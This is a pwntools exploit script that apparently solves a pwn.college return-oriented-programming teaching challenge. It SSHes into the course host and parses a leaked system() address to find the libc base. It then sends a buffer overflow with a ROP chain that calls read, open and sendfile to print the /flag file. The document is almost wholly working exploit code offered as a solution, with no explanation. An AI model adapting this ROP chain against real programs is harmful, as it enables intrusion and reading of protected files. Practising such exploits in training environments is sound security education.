from pwn import *

e = ELF('./babyrop_level7_teaching1')
libc = ELF('../libc6_2.31-0ubuntu9.2_amd64.so')
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",keyfile='../../key',port=22)

p = s.run('/babyrop_level7_teaching1')

rdi = 0x00000000004019e3
ret = 0x000000000040101a

p.recvuntil(b'is: ')
system = int(p.recvuntil(b'.',drop=True), 16)

base = system - libc.symbols['system']
libc.address = base

rsi = 0x0000000000027529 + base
rcx = 0x000000000009f822 + base
rdx_r12 = 0x000000000011c371 + base

pay = b'A' * 0x68
pay += p64(rdi) + p64(0) + p64(rsi) + p64(e.bss() + 0x100) + p64(rdx_r12) + p64(0x8) + p64(0) + p64(libc.symbols['read']) #read(0,bss+0x100,8);
pay += p64(rdi) + p64(e.bss() + 0x100) + p64(rsi) + p64(0) + p64(libc.symbols['open'])
pay += p64(rdi) + p64(1) + p64(rsi) + p64(3) + p64(rdx_r12) + p64(0) + p64(0) + p64(rcx) + p64(100) + p64(libc.symbols['sendfile']) 

p.sendafter(b'\n\n',pay)

p.sendafter(b'Exiting!\n',b'/flag\x00')

p.interactive()